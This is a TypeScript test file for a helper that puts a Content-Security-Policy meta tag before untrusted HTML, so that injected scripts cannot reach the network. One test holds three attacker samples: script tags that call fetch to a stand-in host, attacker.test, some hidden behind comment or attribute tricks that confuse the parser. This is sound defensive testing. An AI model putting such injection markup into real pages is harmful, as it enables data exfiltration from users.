import { describe, expect, test } from "bun:test";

import { RENDER_POLICY, withRenderPolicy } from "./render-policy";

describe("withRenderPolicy", () => {
  test("places the policy before every byte of plan markup", () => {
    const out = withRenderPolicy("<html><head><title>x</title></head></html>");
    expect(out.startsWith("<!doctype html><meta http-equiv")).toBe(true);
    expect(out.indexOf("Content-Security-Policy")).toBeLessThan(
      out.indexOf("<title>")
    );
    expect(out).toContain(RENDER_POLICY);
  });

  test("forces standards mode when there is no head", () => {
    const out = withRenderPolicy("<p>hi</p>");
    expect(out.startsWith("<!doctype html><meta http-equiv")).toBe(true);
  });

  test("keeps parser-confusing attacker markup after the policy", () => {
    for (const html of [
      '<!-- <head> --><script>fetch("https://attacker.test")</script>',
      '<head data-x=">"><script>fetch("https://attacker.test")</script>',
      '<script>fetch("https://attacker.test")</script><head></head>',
    ]) {
      const out = withRenderPolicy(html);
      expect(out.startsWith("<!doctype html><meta http-equiv")).toBe(true);
      expect(out.indexOf("Content-Security-Policy")).toBeLessThan(
        out.indexOf("https://attacker.test")
      );
    }
  });

  test("denies network and forms while allowing inline scripts", () => {
    expect(RENDER_POLICY).toContain("connect-src 'none'");
    expect(RENDER_POLICY).toContain("form-action 'none'");
    expect(RENDER_POLICY).toContain("script-src 'unsafe-inline'");
  });
});
